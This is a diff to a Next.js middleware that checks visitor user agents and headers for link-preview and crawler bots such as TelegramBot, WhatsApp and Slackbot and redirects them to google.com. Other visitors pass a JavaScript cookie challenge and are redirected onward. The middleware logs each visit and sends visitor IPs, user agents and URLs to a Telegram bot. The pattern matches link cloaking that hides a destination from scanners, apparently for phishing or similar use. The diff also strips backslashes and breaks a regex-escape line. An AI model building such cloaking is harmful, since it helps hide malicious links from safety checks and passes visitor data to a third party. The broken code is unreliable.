@@ -1,4 +1,4 @@
-// middleware.js
+// middleware_with_logging_and_telegram.js
 import { NextResponse } from "next/server";
 
 const BOT_JSON_URL = "https://raw.githubusercontent.com/arcjet/well-known-bots/main/well-known-bots.json";
@@ -33,10 +33,10 @@ async function loadBotRegexes() {
 
       // add some explicit Telegram-specific patterns (common variants)
       const explicit = [
-        "TelegramBot",           // generic
-        "TelegramBot\\/.*",      // TelegramBot/1.0 etc
-        "Telegram",              // broad helicopter
-        "WhatsApp",              // other link preview bots you may want to detect
+        "TelegramBot",
+        "TelegramBot\/.*",
+        "Telegram",
+        "WhatsApp",
         "facebookexternalhit",
         "Slackbot",
         "Discordbot",
@@ -63,7 +63,7 @@ async function loadBotRegexes() {
             } else {
               try { regexes.push(new RegExp(pattern, "i")); }
               catch (e) {
-                regexes.push(new RegExp(pattern.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "i"));
+                regexes.push(new RegExp(pattern.replace(/[.*+?^${}()|[\]\]/g, "\$&"), "i"));
               }
             }
           } catch (e) { /* ignore malformed */ }
@@ -111,7 +111,8 @@ async function notifyTelegram(text, req) {
   const chat = CHAT_ID || process.env.TG_CHAT_ID;
   if (!token || !chat) return;
   const mainDomain = getDomain(req);
-  const finalText = `🌐 main: ${mainDomain}\n${text}`;
+  const finalText = `🌐 main: ${mainDomain}
+${text}`;
   const controller = new AbortController();
   const id = setTimeout(() => controller.abort(), TELEGRAM_TIMEOUT_MS);
   try {
@@ -128,8 +129,6 @@ async function notifyTelegram(text, req) {
 
 /* -------------------- helper: cookie helpers -------------------- */
 function setHumanCookie(resp) {
-  // NextResponse doesn't expose cookie setter on the object created by NextResponse.redirect in same way on edge,
-  // but we can set header directly.
   const cookie = `${JS_CHALLENGE_COOKIE}=1; Path=/; HttpOnly; Max-Age=${JS_CHALLENGE_TTL_SEC}`;
   resp.headers.set("Set-Cookie", cookie);
   return resp;
@@ -137,7 +136,6 @@ function setHumanCookie(resp) {
 
 /* -------------------- helper: simple browser header heuristics -------------------- */
 function browserHeaderScore(headers) {
-  // return a small score; higher => more likely human.
   let score = 0;
   const has = (h) => !!(headers.get && headers.get(h)) || !!headers[h];
   if (has("user-agent")) score += 1;
@@ -149,10 +147,53 @@ function browserHeaderScore(headers) {
   return score;
 }
 
+/* -------------------- logging helpers -------------------- */
+function sanitizeHeaderValue(val, max = 500) {
+  if (!val) return "";
+  if (typeof val !== "string") return String(val);
+  return val.length > max ? val.slice(0, max) + "..." : val;
+}
+
+function buildLogPayload(req, extra = {}) {
+  const headers = req.headers || {};
+  const ipRaw = (headers.get ? (headers.get("x-forwarded-for") || headers.get("cf-connecting-ip")) : (headers["x-forwarded-for"] || headers["cf-connecting-ip"])) || "unknown";
+  const ip = (ipRaw || "unknown").split(",")[0].trim();
+  const ua = sanitizeHeaderValue(headers.get ? headers.get("user-agent") : headers["user-agent"] || "");
+  const accept = sanitizeHeaderValue(headers.get ? headers.get("accept") : headers["accept"] || "");
+  const acceptLang = sanitizeHeaderValue(headers.get ? headers.get("accept-language") : headers["accept-language"] || "");
+  const referer = sanitizeHeaderValue(headers.get ? headers.get("referer") : headers["referer"] || "");
+
+  return {
+    ts: new Date().toISOString(),
+    ip,
+    url: req.nextUrl ? (req.nextUrl.pathname + (req.nextUrl.search || "")) : (req.url || ""),
+    ua,
+    accept,
+    acceptLang,
+    referer,
+    cookie_present: !!(headers.get ? headers.get("cookie") : headers["cookie"]),
+    ...extra
+  };
+}
+
+function logInfo(label, payload) {
+  try {
+    // short human-friendly
+    console.info(`[${label}]`, payload.ts, payload.ip, payload.url, payload.ua ? payload.ua.slice(0,120) : "-");
+    // full structured JSON for machines
+    console.debug(JSON.stringify({ level: "info", label, ...payload }));
+  } catch (e) { console.warn("logInfo failed", e); }
+}
+
+function logWarn(label, payload) {
+  try {
+    console.warn(`[${label}]`, payload.ts, payload.ip, payload.url, payload.ua ? payload.ua.slice(0,120) : "-");
+    console.debug(JSON.stringify({ level: "warn", label, ...payload }));
+  } catch (e) { console.warn("logWarn failed", e); }
+}
+
 /* -------------------- JS challenge HTML -------------------- */
 function jsChallengeHtml(targetUrl) {
-  // minimal, sets cookie via document.cookie and navigates to target
-  // noscript fallback with meta-refresh
   return `<!doctype html>
 <html>
   <head>
@@ -163,10 +204,8 @@ function jsChallengeHtml(targetUrl) {
     <meta name="robots" content="noindex">
     <script>
       try {
-        // set a cookie visible on server (HttpOnly not possible from JS, but server-set will be set next request)
         document.cookie = "${JS_CHALLENGE_COOKIE}=1; path=/; max-age=${JS_CHALLENGE_TTL_SEC}; SameSite=Lax";
       } catch(e){}
-      // small delay to let cookie set
       setTimeout(function(){ window.location.replace(${JSON.stringify(targetUrl)}); }, 50);
     </script>
     <noscript>
@@ -181,18 +220,26 @@ function jsChallengeHtml(targetUrl) {
 
 /* -------------------- main middleware -------------------- */
 export async function middleware(req) {
-  const ua = (req.headers.get("user-agent") || "").slice(0, 200);
+  const ua = (req.headers.get("user-agent") || "").slice(0, 300);
   const url = req.nextUrl.pathname + (req.nextUrl.search || "");
   const ip = (req.headers.get("x-forwarded-for") || req.headers.get("cf-connecting-ip") || "unknown").split(",")[0].trim();
   const mainDomain = getDomain(req);
   const headers = req.headers;
 
+  // log incoming
+  const incomingPayload = buildLogPayload(req, { phase: "incoming" });
+  logInfo("visit.incoming", incomingPayload);
+
   // quick human-like UA check
-  const isHumanUA = ua.includes("Mozilla") || ua.includes("Chrome") || ua.includes("Safari") || ua.includes("Gecko");
+  const isHumanUA = ua.includes("Mozilla") || ua.includes("Chrome") || ua.includes("Safari") || ua.includes("Gecko") || ua.includes("Edge");
 
   // if UA empty -> suspicious
   if (!ua) {
-    notifyTelegram(`🚨 Empty UA\nIP: ${ip}\nURL: ${url}`, req);
+    const p = buildLogPayload(req, { phase: "empty_ua" });
+    logWarn("visit.empty_ua", p);
+    notifyTelegram(`🚨 Empty UA
+IP: ${ip}
+URL: ${url}`, req);
     return NextResponse.redirect("https://google.com");
   }
 
@@ -207,8 +254,11 @@ export async function middleware(req) {
 
   // header-based heuristic score
   const score = browserHeaderScore(headers);
-  // score thresholds: >=5 likely human, <=2 likely bot
   const likelyHuman = score >= 4 || isHumanUA;
+
+  // enrich log with diagnostics
+  const diag = { score, likelyHuman, isKnownBot };
+  logInfo("visit.diagnostics", buildLogPayload(req, { phase: "diagnostics", ...diag }));
 
   // ip cache quick check
   const ipCache = globalThis.__bot_cache.ipCache;
@@ -217,7 +267,12 @@ export async function middleware(req) {
     const cached = ipCache.get(ip);
     if (cached && cached.expires > now) {
       if (cached.isBot) {
-        notifyTelegram(`🚨 Cached bot IP\nUA: ${ua}\nIP: ${ip}\nURL: ${url}`, req);
+        const p = buildLogPayload(req, { phase: "cached_block", isBot: true });
+        logWarn("visit.cached_block", p);
+        notifyTelegram(`🚨 Cached bot IP
+UA: ${ua}
+IP: ${ip}
+URL: ${url}`, req);
         return NextResponse.redirect("https://google.com");
       }
     }
@@ -225,9 +280,13 @@ export async function middleware(req) {
 
   // If clearly known bot by regex -> block
   if (isKnownBot && !likelyHuman) {
-    // cache ip as bot short-term
     if (ip && ip !== "unknown") ipCache.set(ip, { isBot: true, expires: now + 5 * 60 * 1000 }); // 5 min
-    notifyTelegram(`🚨 Known bot detected\nUA: ${ua}\nIP: ${ip}\nURL: ${url}`, req);
+    const p = buildLogPayload(req, { phase: "known_bot", isBot: true });
+    logWarn("visit.known_bot", p);
+    notifyTelegram(`🚨 Known bot detected
+UA: ${ua}
+IP: ${ip}
+URL: ${url}`, req);
     return NextResponse.redirect("https://google.com");
   }
 
@@ -248,6 +307,15 @@ export async function middleware(req) {
     });
     // no HttpOnly cookie here (we set via JS). Also set a short server cookie as fallback so next request shows it.
     resp.headers.set("Set-Cookie", `${JS_CHALLENGE_COOKIE}=1; Path=/; Max-Age=${JS_CHALLENGE_TTL_SEC}`);
+
+    const p = buildLogPayload(req, { phase: "js_challenge" });
+    logInfo("visit.js_challenge", p);
+    // keep telegram notify for suspicious but sampled? keeping original behavior: send short notify
+    notifyTelegram(`🚨 JS challenge shown
+UA: ${ua}
+IP: ${ip}
+URL: ${url}`, req);
+
     return resp;
   }
 
@@ -260,6 +328,9 @@ export async function middleware(req) {
 
   // cache IP as human for a short time
   if (ip && ip !== "unknown") ipCache.set(ip, { isBot: false, expires: now + 60 * 60 * 1000 }); // 1 hour
+
+  const p = buildLogPayload(req, { phase: "redirect_human" });
+  logInfo("visit.redirect_human", p);
 
   return redirectResp;
 }
